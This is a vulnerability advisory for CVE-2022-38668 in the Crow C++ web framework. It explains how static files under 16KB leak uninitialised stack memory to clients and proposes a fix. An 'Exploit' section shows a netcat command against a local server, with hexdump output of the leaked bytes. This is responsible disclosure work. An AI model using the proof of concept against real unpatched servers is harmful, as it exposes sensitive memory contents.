<h2><b><i>Summary:</i></b></h2>

Crow versions prior <a src="https://github.com/CrowCpp/Crow/releases/tag/v1.0%2B4">v1.0+4</a> (included) are vulnerable to an Information Disclosure
("Exposure of Sensitive Information to an Unauthorized Actor") issue, due to
improper handling of static resources.
Any request to a static resource, where the static resource is smaller than
16KB, will lead to disclosing up to 16KB of data from the stack.

Affected: Crow version 1.0+4 and older

<a src="https://github.com/CrowCpp/Crow">https://github.com/CrowCpp/Crow</a> - maintained version(fork)

<a src="https://github.com/ipkn/crow">https://github.com/ipkn/crow</a> - original version

CVE ID: [CVE-2022-38668](https://www.cve.org/CVERecord?id=CVE-2022-38668)

CVSS: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

Discovered by:</br>
&ensp;Gynvael Coldwind</br>
&ensp;hebi

Method of discovery:</br>
  &ensp;Manual Analysis (reading the code)</br>

<blockquote>
"Crow is a C++ framework for creating HTTP or Websocket web services. It uses
routing similar to Python's Flask which makes it easy to use. It is also
extremely fast, beating multiple existing C++ frameworks as well as non C++
frameworks." </blockquote> (source: project's README.md)<br></br>

<b>IMPORTANT:</b> This vulnerability is reported under the 90-day policy 
(version 2021), i.e. this report will be shared publicly with the defensive
community on 16th November 2022 if a patch/fix is not available by that time, or
30 days after the fix becomes available. For details please see:
<a src="https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html">https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html</a>


<h2><b><i>Vulnerability details</i></b></h2>

The vulnerability is located in the Connection::do_write_static* method within 
the http_connection.h file.
*<a src="https://github.com/CrowCpp/Crow/blob/master/include/crow/http_connection.h#L393">https://github.com/CrowCpp/Crow/blob/master/include/crow/http_connection.h#L393</a>

This function creates a local buffer with a fixed size of 16384 bytes. Then the
buffer is passed to is.read() method (where "is" denotes an opened local file
pointed to by the static resource mapping) to acquire the content of the given
static resource (file). This call made within a while loop's condition, which
checks if any data was read (if not, the loop will exit).

However, the number of bytes that were read is not being tracked in any form.
Furthermore, the whole buffer is then passed to <code>asio::buffer</code> without specified
size**.

<b>**In this case it means that the whole array size will be used as data size, as
per the following constructor description:</b>

<a src="https://www.boost.org/doc/libs/1_80_0/doc/html/boost_asio/reference/buffer/overload7.html">https://www.boost.org/doc/libs/1_80_0/doc/html/boost_asio/reference/buffer/overload7.html</a>

This in turn leads to the whole local buffer being sent to the client requesting
the resource, including the potentially uninitialized part. This is especially
true for files smaller than 16KB.

<b>Conditions for triggering this behavior are:</b>

<ol>
  <li>Static path needs to be defined.</li>
  <li>At least 1 static file needs to exist</li>
  <li>The file needs to be smaller than 16KB.</li>
</ol>

<h2><b><i>Exploit</i></b></h2>

```
$ cat poc.txt | nc -v 127.0.0.1 18080 | hexdump -C
localhost [127.0.0.1] 18080 (?) open
00000000  48 54 54 50 2f 31 2e 31  20 32 30 30 20 4f 4b 0d  |HTTP/1.1 200 OK.|
00000010  0a 43 6f 6e 74 65 6e 74  2d 54 79 70 65 3a 20 74  |.Content-Type: t|
00000020  65 78 74 2f 70 6c 61 69  6e 0d 0a 43 6f 6e 74 65  |ext/plain..Conte|
00000030  6e 74 2d 4c 65 6e 67 74  68 3a 20 35 0d 0a 53 65  |nt-Length: 5..Se|
00000040  72 76 65 72 3a 20 43 72  6f 77 2f 6d 61 73 74 65  |rver: Crow/maste|
00000050  72 0d 0a 44 61 74 65 3a  20 54 75 65 2c 20 31 36  |r..Date: Tue, 16|
00000060  20 41 75 67 20 32 30 32  32 20 32 32 3a 34 39 3a  | Aug 2022 22:49:|
00000070  32 32 20 47 4d 54 0d 0a  43 6f 6e 6e 65 63 74 69  |22 GMT..Connecti|
00000080  6f 6e 3a 20 4b 65 65 70  2d 41 6c 69 76 65 0d 0a  |on: Keep-Alive..|
00000090  0d 0a 54 65 73 74 0a 00  00 00 00 00 00 00 00 00  |..Test..........|
000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00002a90  00 00 00 00 00 00 00 00  00 00 28 14 00 ac d8 7f  |..........(.....|
00002aa0  00 00 20 14 00 ac d8 7f  00 00 48 f8 8c b4 d8 7f  |.. .......H.....|
00002ab0  00 00 50 f8 8c b4 d8 7f  00 00 49 8a 42 00 00 00  |..P.......I.B...|
00002ac0  00 00 28 14 00 ac d8 7f  00 00 20 14 00 ac d8 7f  |..(....... .....|
00002ad0  00 00 03 00 00 00 00 00  00 00 11 00 00 00 00 00  |................|
00002ae0  00 00 28 14 00 ac d8 7f  00 00 20 14 00 ac d8 7f  |..(....... .....|
00002af0  00 00 c0 f8 8c b4 d8 7f  00 00 cc 89 42 00 00 00  |............B...|
00002b00  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00002b10  00 00 5b 00 00 00 6e 00  00 00 c0 1c 00 ac d8 7f  |..[...n.........|
00002b20  00 00 b0 1c 00 ac d8 7f  00 00 01 00 00 00 00 00  |................|
00002b30  00 00 20 00 00 00 00 00  00 00 08 00 00 00 00 00  |.. .............|
00002b40  00 00 28 14 00 ac d8 7f  00 00 20 14 00 ac d8 7f  |..(....... .....|
00002b50  00 00 b0 1c 00 ac d8 7f  00 00 40 f9 8c b4 d8 7f  |..........@.....|
00002b60  00 00 f0 f8 8c b4 d8 7f  00 00 89 48 49 00 00 00  |...........HI...|
00002b70  00 00 28 3b 8d b4 d8 7f  00 00 30 14 00 ac d8 7f  |..(;......0.....|
00002b80  00 00 40 f9 8c b4 d8 7f  00 00 48 f9 8c b4 d8 7f  |..@.......H.....|
00002b90  00 00 50 f9 8c b4 d8 7f  00 00 99 47 49 00 00 00  |..P........GI...|
00002ba0  00 00 01 00 00 00 00 00  00 00 c8 04 8d b4 d8 7f  |................|
00002bb0  00 00 30 f9 8c b4 d8 7f  00 00 b0 1c 00 ac d8 7f  |..0.............|
00002bc0  00 00 01 00 00 00 00 00  00 00 c8 04 8d b4 d8 7f  |................|
00002bd0  00 00 d0 1c 00 ac d8 7f  00 00 b0 1c 00 ac d8 7f  |................|
00002be0  00 00 30 14 00 ac d8 7f  00 00 30 14 00 ac d8 7f  |..0.......0.....|
00002bf0  00 00 90 f9 8c b4 d8 7f  00 00 00 53 2a 66 e1 24  |...........S*f.$|
00002c00  09 b2 30 14 00 ac d8 7f  00 00 60 ff ff ff ff ff  |..0.......`.....|
...
```

<h2><b><i>Proposed fix:</i></b></h2>

Passing the actual size of bytes read to <code>asio::buffer</code>'s constructor.


<h3><b><i>Timeline</i></b></h3>
<ul>
  <li>2022-08-14: Vulnerability discovered.</li>
  <li>2022-08-17: Vulnerability reported.</li>
  <li>2022-08-21: Public fix was proposed.</li>
  <li>2022-08-22: Public fix was merged in.</li>
  <li>2022-08-22: CVE requested and assigned.</li>
  <li>2022-09-23: Details were published.</li>
</ul>